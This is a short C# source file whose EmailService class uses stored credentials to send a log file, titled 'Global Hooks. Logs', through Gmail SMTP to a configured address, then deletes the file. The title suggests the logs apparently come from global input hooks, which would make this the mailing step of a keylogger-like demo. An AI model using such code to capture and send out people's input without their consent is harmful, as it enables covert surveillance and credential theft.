using System;
using System.Net.Mail;
using System.Windows.Forms;

namespace Demo
{
    class EmailService
    {
        public static void SendEmail()
        {
            try
            {
                var mail = new MailMessage();
                var smtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress(ConfigManager.GetProperty(AppProperties.EmailAddressFromProperty));
                mail.To.Add(ConfigManager.GetProperty(AppProperties.EmailAddressToProperty));
                mail.Subject = "Global Hooks. Logs";
                mail.Body = "Log file:";

                Logger.ReleaseLogFile();

                var attachment = new Attachment("logs.txt");
                mail.Attachments.Add(attachment);

                smtpServer.Credentials = new System.Net.NetworkCredential(
                    ConfigManager.GetProperty(AppProperties.EmailAddressFromProperty),
                    ConfigManager.GetProperty(AppProperties.PasswordProperty));

                smtpServer.Port = 587;
                smtpServer.EnableSsl = true;

                smtpServer.Send(mail);
                attachment.Dispose();
                Logger.CleanUpLogFile();
                MessageBox.Show(@"Mail was sent");
            } catch (Exception)
            {}
        }
    }
}
